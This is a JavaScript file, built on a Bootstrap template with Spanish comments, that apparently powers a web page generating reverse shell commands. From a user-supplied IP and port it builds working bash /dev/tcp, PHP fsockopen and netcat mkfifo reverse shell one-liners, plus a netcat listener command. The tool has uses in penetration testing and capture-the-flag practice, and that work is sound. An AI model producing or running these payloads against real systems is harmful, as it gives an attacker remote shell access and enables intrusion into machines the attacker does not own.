/*!
* Start Bootstrap - Business Frontpage v5.0.9 (https://startbootstrap.com/template/business-frontpage)
* Copyright 2013-2023 Start Bootstrap
* Licensed under MIT (https://github.com/StartBootstrap/startbootstrap-business-frontpage/blob/master/LICENSE)
*/
// This file is intentionally blank
// Use this file to add JavaScript to your project


// -----------------------------------------------------------------------

document.addEventListener("DOMContentLoaded", () => {
    
    // --- LÓGICA DE COPIADO UNIVERSAL ---
    const copyButtons = document.querySelectorAll(".btn-copy");

    copyButtons.forEach(btn => {
        btn.addEventListener("click", () => {
            // Buscamos qué elemento hay que copiar
            const targetId = btn.getAttribute("data-target");
            const targetEl = document.getElementById(targetId);
            
            if (!targetEl) return;

            // Copiamos al portapapeles
            copyText(targetEl.innerText, btn);
        });
    });

    // Función auxiliar para copiar y dar feedback visual
    function copyText(text, btnElement) {
        const textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.position = "fixed"; 
        textArea.style.left = "-9999px";
        document.body.appendChild(textArea);
        textArea.select();

        try {
            document.execCommand("copy");
            
            // Guardamos el HTML original del botón
            const originalHtml = btnElement.innerHTML;
            
            // Feedback Visual
            btnElement.classList.add("btn-success");
            btnElement.innerHTML = '<i class="bi bi-check-lg"></i> Copiado';
            
            setTimeout(() => {
                btnElement.classList.remove("btn-success");
                btnElement.innerHTML = originalHtml;
            }, 1500);

        } catch (err) {
            console.error("Error al copiar", err);
        }
        document.body.removeChild(textArea);
    }
    
    // --- LÓGICA DE REVERSHELL ---

    const rsHost = document.getElementById("lhost");

    if (rsHost) {
        const rsPort = document.getElementById("lport");
        const rsOutput = document.getElementById("output");
        const rsListener = document.getElementById("listener");
        const rsUrlEncode = document.getElementById("urlencode");
        const rsCards = document.querySelectorAll(".shell-card");

        // Función principal que construye el string
        function generateShell() {
            // Si falta IP o Puerto, mostramos texto por defecto
            if (!rsHost.value || !rsPort.value) {
                rsOutput.innerText = "Completa IP y Puerto...";
                rsListener.innerText = "nc -lvnp <PUERTO>";
                return;
            }

            let ip = rsHost.value;
            let p = rsPort.value;

            // Aplicar URL Encode si está marcado
            if (rsUrlEncode.checked) {
                ip = encodeURIComponent(ip);
                p = encodeURIComponent(p);
            }

            // Detectar qué tarjeta está activa (Bash, PHP, Netcat)
            const activeCard = document.querySelector(".shell-card.active input");
            const type = activeCard ? activeCard.value : 'bash';

            // --- PAYLOADS (Aquí puedes añadir más lógica real) ---
            let command = "";
            switch (type) {
                case 'bash':
                    command = `bash -i >& /dev/tcp/${ip}/${p} 0>&1`;
                    break;
                case 'php':
                    command = `php -r '$sock=fsockopen("${ip}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                    break;
                case 'nc':
                    command = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f`;
                    break;
                default:
                    command = `bash -i >& /dev/tcp/${ip}/${p} 0>&1`;
            }

            // Escribimos el resultado en los bloques
            rsOutput.innerText = command;
            rsListener.innerText = `nc -lvnp ${rsPort.value}`;
        }

        // --- Event Listeners ---
        
        // 1. Click en las tarjetas (Cards)
        rsCards.forEach(card => {
            card.addEventListener("click", () => {
                // Quitar clase active de todas
                rsCards.forEach(c => c.classList.remove("active"));
                // Poner active a la clickada
                card.classList.add("active");
                // Marcar el radio button interno manualmente
                const radio = card.querySelector("input");
                if(radio) radio.checked = true;
                
                generateShell();
            });
        });

        // 2. Escribir en los inputs
        [rsHost, rsPort, rsUrlEncode].forEach(el => {
            el.addEventListener("input", generateShell);
            el.addEventListener("change", generateShell); // Para el checkbox
        });
    }
});